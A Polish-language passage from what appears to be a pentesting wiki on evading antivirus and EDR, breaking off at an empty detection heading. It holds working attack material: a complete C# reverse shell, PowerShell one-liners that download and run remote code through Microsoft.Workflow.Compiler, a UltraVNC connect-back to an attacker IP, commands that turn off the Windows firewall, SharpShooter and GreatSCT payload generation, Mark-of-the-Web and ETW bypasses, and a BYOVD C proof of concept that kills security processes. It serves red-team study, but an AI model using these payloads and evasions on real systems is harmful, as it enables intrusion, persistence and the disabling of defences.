     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje stałe ciągi znaków.

3.  Usuwanie proxy calls – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne zwykłe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby znaleźć *właściwy* payload. Często malware przechowuje go jako zakodowaną w formacie TLV tablicę bajtów inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch odtwarza przepływ wykonania **bez** konieczności uruchamiania złośliwego pliku – przydatne podczas pracy na stacji roboczej odłączonej od sieci.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej klasyfikacji próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest stworzenie open-source'owego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania dzięki [obfuskacji kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczaniu przed modyfikacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak wykorzystać język `C++11/14` do generowania zaciemnionego kodu w czasie kompilacji, bez zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę zaciemnionych operacji wygenerowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binarny x64, który potrafi zaciemniać różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnej obfuskacji kodu dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator zaciemnia program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co zakłóca nasze naturalne postrzeganie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekształcać istniejące pliki EXE/DLL w shellcode, a następnie je ładować

### Samomaskowanie poszczególnych funkcji wspomagane przez kompilator LLVM

Zamiast maskować cały implant tylko podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje zamaskowane operacją XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera nazwy po demanglingu zawierające `REG_`, wstawia niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden współdzielony handler maskowania w sekcji `.text`; sygnatury na poziomie źródłowym oraz konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformację należy wykonać po wyborze instrukcji i optymalizacji, ponieważ musi obejmować **każdy wygenerowany return** i znać dokładny układ x86. `MachineFunctionPass` uruchamiany przed emisją wyszukuje ostatnią instrukcję `MachineInstr::isReturn()`, usuwa ją, aby końcowa ścieżka przechodziła dalej do dołączonego epilogu, a wcześniejsze instrukcje return zastępuje przez `JMP_1 handler`. Należy zachować wygenerowane przez kompilator zdejmowanie stosu/ramki poprzedzające każdą instrukcję return; przekierować należy wyłącznie samą instrukcję return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emitują stuby dla poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają, by skok w prologu wskazywał na późniejszy epilog; przy ręcznym emitowaniu bliskiego `je` należy zapisać `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Pass musi zwrócić `false` dla niewybranej funkcji, jeśli nie wprowadził żadnych zmian; PoC błędnie zwraca w tej ścieżce `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające wskaźnik do funkcji, relokowany przez loader, oraz długość w czasie wykonywania w sekcji `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, pobierając długość i jej dopełnienie, a rekordy przetwarza co `0x10` bajtów. Nazwy sekcji PE mają tylko osiem bajtów, więc wyszukiwanie w czasie wykonywania widzi `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w stubie stary RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przegląda importy PE32+, aby rozwiązać już zaimportowaną funkcję `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Zawsze czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija nadal odszyfrowane ciało. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Stub usuwa znacznik i po zamaskowaniu wszystkich ciał skacze do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby zdekodować ciało. Końcowa ścieżka przechodzi dalej do dołączonego epilogu, a każde wcześniejsze return skacze bezpośrednio do współdzielonego handlera. Zwykły epilog również używa `jmp handler` zamiast `call`, więc po ponownym zamaskowaniu instrukcji `ret` handlera pobiera adres powrotu pierwotnego wywołującego i zachowuje wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Prymityw maskowania i wskaźniki analityczne

Handler znajduje bieżący rekord, pomija stały, widoczny prolog (w tej kompilacji `0x46` bajtów), zmienia ochronę pozostałej części na `PAGE_EXECUTE_READWRITE`, wykonuje XOR każdego bajtu z najmłodszym bajtem klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla dekoduje więc kod przy wejściu i koduje go przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Charakterystyczne wskaźniki tej techniki to:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia wewnątrz wykonywalnej sekcji `.stub` oraz sekcja `.funcmet` zawierająca klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, po którym następują wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC w stylu `call`/`pop` oraz wiele miejsc powrotu przekierowanych do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` oraz bajtowe zapisy XOR do stron wykonywalnych opartych na obrazie.

To technika omijania skanerów pamięci, a nie ochrona kryptograficzna: spatchowany plik nadal zawiera oryginalne, jawne ciało funkcji, a debugger może zatrzymać się na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` sprawiają również, że odzyskanie kodu offline jest proste.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Sloty TEB używane w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są współdzielone w całym procesie. Równoległe lub rekurencyjne wejście może więc ponownie przełączać instrukcje, gdy inne wywołanie nadal je wykonuje; wyjątki i wyjścia nielokalne również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować przełączenia, przywracać ochronę faktycznie zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzić ścieżki `call` i `jmp` pod kątem wyrównania stosu x64 oraz wywoływać `FlushInstructionCache` po przepisaniu bajtów wykonywalnych. Microsoft wyraźnie wskazuje, że odpowiedzialność za spójność pamięci podręcznej instrukcji po modyfikacji kodu wykonywalnego spoczywa na wywołującym.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen i MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (choć nadal można go uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu i zawiera adres URL, z którego pobrano plik.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem na to, by payloady nie otrzymały Mark of The Web, jest umieszczenie ich w kontenerze, na przykład ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** zostać zastosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Oto demonstracja omijania SmartScreen przez pakowanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to wydajny mechanizm logowania w systemie Windows, który pozwala aplikacjom i składnikom systemu **rejestrować zdarzenia**. Mogą go jednak również używać produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak można wyłączyć (ominąć) AMSI, można też sprawić, by funkcja **`EtwEventWrite`** procesu działającego w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania żadnych zdarzeń. Osiąga się to przez załatanie funkcji w pamięci, aby natychmiast zwracała wynik, co skutecznie wyłącza logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) i [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od dawna i nadal stanowi świetny sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisu na dysku, musimy jedynie zadbać o załatanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) umożliwia już bezpośrednie uruchamianie assembly C# w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, uruchomieniu tego kodu, a po zakończeniu — zabiciu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostaniemy wykryci, **znacznie bardziej prawdopodobne** jest, że nasz **implant przetrwa**. Wadą jest **większe prawdopodobieństwo** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu nie trzeba tworzyć nowego procesu ani narażać go na skanowanie przez AV, ale wadą jest **znacznie większe prawdopodobieństwo** **utraty beacona**, jeśli coś pójdzie nie tak podczas wykonywania payloadu, ponieważ proces może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz zapoznaj się z ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell** — sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udziale SMB kontrolowanym przez atakującego**.

Zapewniając dostęp do plików binarnych interpretera i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

W repozytorium wskazano, że Defender nadal skanuje skrypty, ale użycie Go, Java, PHP itp. daje **większą elastyczność w omijaniu sygnatur statycznych**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokenu może pozwolić procesowi działać dalej, uniemożliwiając mu jednocześnie wykonywanie uprzywilejowanych działań inspekcyjnych lub naprawczych.

Aby temu zapobiec, system Windows mógłby **uniemożliwiać procesom zewnętrznym** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia nad nim kontroli i utrzymania persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla systemu Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj podane polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Zaawansowane unikanie wykrycia

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Unikanie wykrycia to bardzo złożony temat. Czasem trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach całkowite uniknięcie wykrycia jest praktycznie niemożliwe.

Każde środowisko, z którym się mierzysz, ma swoje mocne i słabe strony.

Zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby poznać podstawy bardziej zaawansowanych technik unikania wykrycia.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) poświęcone wielowarstwowemu unikaniu wykrycia.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Starsze techniki**

### **Sprawdzanie, które części Defender wykrywa jako złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usuwa kolejne części pliku binarnego**, aż **ustali, którą część Defender** wykrywa jako złośliwą, a następnie ją wyodrębnia.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia usługę online pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Spraw, aby **uruchamiał się** przy starcie systemu, i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu** (stealth) i wyłącz zaporę sieciową:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki binarne, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w polu _VNC Password_
- Ustaw hasło w polu _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na komputer **ofiary**

#### **Połączenie zwrotne**

**Napastnik** powinien **uruchomić na swoim** **hoście** plik binarny `vncviewer.exe -listen 5900`, aby przygotować się na odebranie zwrotnego **połączenia VNC**. Następnie na komputerze **ofiary** uruchom demona winvnc poleceniem `winvnc.exe -run`, a potem wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować skrytość, nie należy robić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywoła to [wyskakujące okno](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo otworzy się [okno konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby wyświetlić pomoc, bo wywoła to [wyskakujące okno](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload XML** za pomocą:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy reverse shell w C#

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# przy użyciu kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Użycie Pythona do tworzenia injectorów — przykład:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji jądra, których nie mogą zablokować nawet usługi AV chronione przez Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze wnioski
1. **Podpisany sterownik**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale binarnie jest to legalnie podpisany sterownik `AToolsKrnl64.sys` z pakietu „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma prawidłowy podpis Microsoftu, ładuje się nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwszy wiersz rejestruje sterownik jako **usługę jądra**, a drugi go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTLs udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu według PID (używane do zatrzymywania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia w trybie użytkownika; kod działający w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra, niezależnie od funkcji PPL/PP, ELAM i innych mechanizmów hardeningu.

Wykrywanie / łagodzenie skutków
